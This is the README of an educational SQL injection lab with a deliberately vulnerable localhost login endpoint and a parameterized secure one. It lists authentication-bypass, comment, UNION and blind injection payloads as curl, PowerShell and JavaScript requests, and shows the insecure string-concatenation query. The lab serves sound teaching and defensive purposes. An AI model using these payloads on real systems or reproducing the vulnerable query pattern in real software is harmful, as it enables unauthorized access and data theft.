# 🔒 SQL Injection Lab - Complete Setup & Testing Guide

Welcome to the SQL Injection Educational Lab! This is a controlled, safe environment to learn about SQL injection vulnerabilities and how to prevent them.

---

## 📖 Quick Navigation

| Document | Purpose |
|----------|---------|
| **[SQL_INJECTION_LAB_GUIDE.md](./SQL_INJECTION_LAB_GUIDE.md)** | Detailed technical guide with 12+ test payloads |
| **[SECURITY_LAB.md](./SECURITY_LAB.md)** | Detection system documentation |
| This file | Setup, quick start, and testing instructions |

---

## 🚀 Quick Start (5 Minutes)

### Step 1: Start the Backend
```bash
cd backend
npm install
npm start
# Backend should run on http://localhost:5000
```

### Step 2: Start the Frontend (in new terminal)
```bash
cd frontend
npm install
npm run dev
# Frontend should run on http://localhost:3000
```

### Step 3: Run Automated Tests
```bash
# From root directory
npm run test-payloads

# Or manually:
node test-payloads.js
```

### Step 4: Visit Interactive Lab
Open browser: **http://localhost:3000/security-lab/sql-injection**

---

## 🎯 What You'll Learn

### Vulnerability Types
- ✅ **Condition-Based SQL Injection** - Manipulating boolean logic
- ✅ **Comment-Based Injection** - Using SQL comments to alter queries
- ✅ **UNION-Based Injection** - Combining SELECT statements
- ✅ **Blind SQL Injection** - Extracting data without direct results
- ✅ **Stacked Queries** - Executing multiple SQL statements

### Security Concepts
- 🛡️ **Parameterized Queries** - The gold standard defense
- 🛡️ **Input Validation** - Pattern matching and whitelisting
- 🛡️ **Prepared Statements** - Query pre-compilation
- 🛡️ **Stored Procedures** - Database-level protection
- 🛡️ **Detection Systems** - Logging suspicious patterns

---

## 🧪 Three Ways to Test

### Method 1: Interactive Web Interface (Easiest)
```
1. Navigate to http://localhost:3000/security-lab/sql-injection
2. Toggle between "Vulnerable" and "Secure" modes
3. Enter test payloads
4. Watch real-time SQL query display
5. See results side-by-side
```

**Best for:** Visual learners, beginners

---

### Method 2: Automated Script (Recommended)
```bash
npm run test-payloads
```

**Output shows:**
- 12 pre-configured test payloads
- Side-by-side vulnerable vs secure results
- SQL queries that get executed
- Color-coded success/failure indicators

**Best for:** Systematic learning, batch testing

---

### Method 3: Manual API Testing (Advanced)

#### Using PowerShell
```powershell
# Test 1: Valid credentials
$body = @{
    username = "admin_demo"
    password = "DemoPass123"
} | ConvertTo-Json

Invoke-RestMethod -Method Post `
  -Uri "http://localhost:5000/api/security-lab/sql-injection/login-vulnerable" `
  -ContentType "application/json" `
  -Body $body

# Test 2: OR-based bypass
$body = @{
    username = "admin_demo' OR '1'='1"
    password = "anything"
} | ConvertTo-Json

Invoke-RestMethod -Method Post `
  -Uri "http://localhost:5000/api/security-lab/sql-injection/login-vulnerable" `
  -ContentType "application/json" `
  -Body $body
```

#### Using curl
```bash
# OR-based bypass
curl -X POST http://localhost:5000/api/security-lab/sql-injection/login-vulnerable \
  -H "Content-Type: application/json" \
  -d '{"username":"admin_demo'"'"' OR '"'"'1'"'"'='"'"'1","password":"anything"}'

# Comment bypass
curl -X POST http://localhost:5000/api/security-lab/sql-injection/login-vulnerable \
  -H "Content-Type: application/json" \
  -d '{"username":"admin_demo'"'"' --","password":"ignored"}'
```

#### Using JavaScript
```javascript
async function testSQLi(username, password) {
  const response = await fetch('http://localhost:5000/api/security-lab/sql-injection/login-vulnerable', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username, password })
  });
  return await response.json();
}

// Test
testSQLi("admin_demo' OR '1'='1", "anything");
```

**Best for:** Custom testing, automation

---

## 🔑 Test Credentials

### Primary Test User (Has Secret Flag)
```
Username: admin_demo
Password: DemoPass123
Secret Flag: FLAG{sqli_demo_success_99182}
```

### Secondary Test User
```
Username: user_demo
Password: UserPass456
Secret: Welcome to the secure user area!
```

---

## 📋 Key Test Payloads

### 1️⃣ Classic OR Bypass (Most Common)
```
Username: admin_demo' OR '1'='1
Password: anything
Expected: VULNERABLE ✅ | SECURE ❌
```

**SQL Generated (Vulnerable):**
```sql
SELECT * FROM lab_users 
WHERE username = 'admin_demo' OR '1'='1' AND password = 'anything'
-- '1'='1' is ALWAYS true, bypasses authentication
```

---

### 2️⃣ Comment Injection (Ignores Password)
```
Username: admin_demo' --
Password: (leave blank)
Expected: VULNERABLE ✅ | SECURE ❌
```

**SQL Generated (Vulnerable):**
```sql
SELECT * FROM lab_users 
WHERE username = 'admin_demo' --' AND password = ''
-- Everything after -- is ignored
```

---

### 3️⃣ UNION SELECT (Data Extraction)
```
Username: admin_demo' UNION SELECT 1,2,3 --
Password: anything
Expected: VULNERABLE ⚠️ | SECURE ❌
```

**SQL Generated (Vulnerable):**
```sql
SELECT * FROM lab_users 
WHERE username = 'admin_demo' UNION SELECT 1,2,3 --' AND password = 'anything'
-- Combines two SELECT results
```

---

### 4️⃣ Boolean-Based Blind SQLi (Advanced)
```
Username: admin_demo' AND '1'='1' --
Password: anything
Expected: VULNERABLE ✅ | SECURE ❌
```

**SQL Generated (Vulnerable):**
```sql
SELECT * FROM lab_users 
WHERE username = 'admin_demo' AND '1'='1' --' AND password = 'anything'
-- Attacker can infer information from true/false responses
```

---

## 🛡️ Defense Mechanisms

### The Lab Shows Two Approaches

#### ❌ VULNERABLE: String Concatenation
```typescript
// Don't do this!
const sql = `SELECT * FROM lab_users WHERE username = '${username}' AND password = '${password}'`;
await dbQuery(sql);  // Direct execution
```

**Why it's bad:**
- User input is directly merged into SQL
- Special characters like `'`, `;`, `--` change query meaning
- Attacker controls the SQL structure

---

#### ✅ SECURE: Parameterized Queries
```typescript
// Always do this!
const sql = 'SELECT * FROM lab_users WHERE username = ? AND password = ?';
await dbQuery(sql, [username, password]);  // Separate parameters
```

**Why it's good:**
- SQL structure is defined first
- Parameters are sent separately
- Database treats user input as DATA, not CODE
- Special characters are automatically escaped
- Query structure cannot be modified by user input

---

## 📊 Lab Architecture

```
┌─────────────────────────────────────────────────┐
│           Frontend (Next.js)                     │
│  http://localhost:3000/security-lab/sql-injection│
└────────────────────┬────────────────────────────┘
                     │
                     │ HTTP POST
                     ↓
┌─────────────────────────────────────────────────┐
│        Backend (Express.js)                      │
│  /api/security-lab/sql-injection/                │
│    - login-vulnerable  (UNSAFE: string concat)   │
│    - login-secure      (SAFE: parameterized)     │
└────────────────────┬────────────────────────────┘
                     │
                     │ SQL Queries
                     ↓
┌─────────────────────────────────────────────────┐
│         MySQL Database                           │
│                                                  │
│  lab_users Table:                               │
│  ├─ admin_demo / DemoPass123                    │
│  └─ user_demo / UserPass456                     │
│                                                  │
│  Security Logging:                              │
│  ├─ SQL injection attempts logged               │
│  ├─ Security events recorded                    │
│  └─ Audit trails maintained                     │
└─────────────────────────────────────────────────┘
```

---

## 🔍 What Gets Logged

Every suspicious request is logged with:
- 🕐 **Timestamp** - When the attempt occurred
- 👤 **User Attempt** - What username was tried
- 🎯 **Pattern Detected** - Which SQL injection pattern matched
- 📱 **IP Address** - Source of the request
- 🖥️ **User Agent** - Browser/client information
- 📋 **Endpoint** - Which security lab endpoint was targeted
- 🔐 **Severity Level** - How dangerous the attempt was

**View logs:**
```bash
# Recent 20 security events
Get-Content logs/security.json.log -Tail 20

# On Linux/Mac:
tail -20 logs/security.json.log
```

---

## 📈 Learning Path

### Beginner (0-30 minutes)
1. ✅ Read this README
2. ✅ Start both servers (backend + frontend)
3. ✅ Visit the interactive web interface
4. ✅ Test with "Valid Credentials" first
5. ✅ Try Test 1: OR-based bypass
6. ✅ Observe the difference between vulnerable/secure

### Intermediate (30-90 minutes)
1. ✅ Read `SQL_INJECTION_LAB_GUIDE.md`
2. ✅ Run `npm run test-payloads` to see all tests
3. ✅ Test all 6-8 basic payloads manually
4. ✅ Understand how each attack works
5. ✅ Study the secure parameterized query approach

### Advanced (90+ minutes)
1. ✅ Test complex payloads (UNION SELECT, Blind SQLi)
2. ✅ Modify the backend code to understand it deeper
3. ✅ Write custom payloads
4. ✅ Review the detection patterns
5. ✅ Test edge cases and bypasses

---

## 🚨 Important Safety Notes

⚠️ **This is for EDUCATIONAL purposes only**

- ✅ **DO** use this lab to learn about SQL injection
- ✅ **DO** practice secure coding habits
- ✅ **DO** use parameterized queries in all applications
- ❌ **DON'T** attempt SQL injection on systems you don't own
- ❌ **DON'T** use vulnerable code in production
- ❌ **DON'T** share vulnerable code patterns
- ❌ **DON'T** attempt to hack other systems

---

## 🔧 Troubleshooting

### Backend won't start
```bash
# Check if port 5000 is in use
netstat -ano | findstr :5000  # Windows
lsof -i :5000                  # Mac/Linux

# Kill the process or use different port
# Edit backend src/index.ts to change port
```

### Frontend can't reach backend
- ✅ Verify backend is running on port 5000
- ✅ Check firewall settings
- ✅ Make sure CORS is enabled (it is by default)
- ✅ Check browser console for errors (F12)

### Database connection error
```bash
# Ensure MySQL is running
# Check backend/src/config/db.ts for connection settings
# Verify database cybersec_lab exists

# Run migrations:
mysql < database/schema.sql
mysql < database/seed.sql
```

### Test script won't run
```bash
# Make sure backend is running first
npm run test-payloads

# Or manually:
node test-payloads.js

# Check Node.js version (requires 14+)
node --version
```

---

## 📚 Additional Learning Resources

### OWASP (Open Web Application Security Project)
- [OWASP Top 10 - A03:2021 Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)

### Related Security Topics
- [CORS (Cross-Origin Resource Sharing)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
- [Authentication Best Practices](https://owasp.org/www-project-authentication-cheat-sheet/)
- [Password Storage](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)

### Hands-On Practice
- [DVWA (Damn Vulnerable Web App)](http://www.dvwa.co.uk/) - Similar lab environment
- [WebGoat](https://owasp.org/www-project-webgoat/) - OWASP's training app
- [HackTheBox](https://www.hackthebox.com/) - Real penetration testing practice

---

## 📁 Project Structure

```
shop-project/
├── SQL_INJECTION_LAB_GUIDE.md     ← Detailed technical guide
├── SECURITY_LAB.md                ← Detection system docs
├── SECURITY_LAB_TESTING_README.md ← This file
├── test-payloads.js               ← Automated test script
├── package.json                   ← npm scripts for testing
│
├── backend/                       ← Express.js API Server
│   ├── src/
│   │   ├── controllers/
│   │   │   └── securityLab.controller.ts   ← Vulnerable & Secure endpoints
│   │   ├── routes/
│   │   │   └── securityLab.routes.ts
│   │   └── utils/
│   │       └── sqlInjectionDetector.ts    ← Pattern detection
│   └── package.json
│
├── frontend/                      ← Next.js Interactive Lab
│   ├── app/
│   │   └── security-lab/
│   │       └── sql-injection/
│   │           └── page.tsx       ← Web interface for testing
│   └── package.json
│
└── database/
    ├── schema.sql                 ← Includes lab_users table
    └── seed.sql                   ← Test data
```

---

## 🎓 Key Takeaways

### What SQL Injection Is
A security vulnerability where attacker input is treated as SQL code, allowing them to:
- Bypass authentication
- Extract sensitive data
- Modify or delete database contents
- Execute arbitrary commands

### How to Prevent It
1. **Always use parameterized queries** (Best)
2. Use prepared statements
3. Validate and whitelist inputs
4. Use stored procedures
5. Escape special characters (Last resort)
6. Monitor and log suspicious activity

### Why Parameterized Queries Work
- SQL structure is defined before user input
- Parameters are sent separately to the database
- Database driver ensures user input is treated as DATA, not SQL CODE
- Special characters are automatically escaped

---

## ✨ Features of This Lab

| Feature | Vulnerable | Secure |
|---------|-----------|--------|
| Runs SQL queries | ✅ Direct | ✅ Parameterized |
| Shows executed SQL | ✅ Yes | ✅ Yes |
| Allows auth bypass | ✅ Yes | ❌ No |
| Returns query results | ✅ Yes | ✅ Yes |
| Logs SQL injection attempts | ✅ Yes | ✅ Yes |
| Detects malicious patterns | ✅ Yes | ✅ Yes |
| Educational value | ✅ High | ✅ High |

---

## 🤝 Contributing to Your Learning

### Questions to Ask Yourself
1. Why does the vulnerable endpoint return results?
2. How does parameterization prevent injection?
3. What happens with special characters in parameterized queries?
4. How would you detect SQL injection in a real system?
5. What other input fields could be vulnerable?

### Experiments to Try
1. Create custom payloads and test them
2. Modify the backend code to test defenses
3. Try to bypass the detection system
4. Extract data using UNION SELECT
5. Test time-based blind SQL injection

---

## 📞 Need Help?

If you encounter issues:

1. **Check logs:**
   ```bash
   tail -20 logs/security.json.log
   ```

2. **Verify services are running:**
   - Backend: http://localhost:5000/api/security-lab/sql-injection/login-vulnerable
   - Frontend: http://localhost:3000/security-lab/sql-injection
   - Database: Check MySQL connection in backend

3. **Review error messages in:**
   - Browser Console (F12)
   - Terminal output from backend
   - Application logs

---

## 📝 Last Updated
June 15, 2026

## 📄 License
Educational Use Only - Do Not Use in Production

---

**Happy Learning! 🎓 Remember: Use this knowledge responsibly to secure systems, not harm them.**
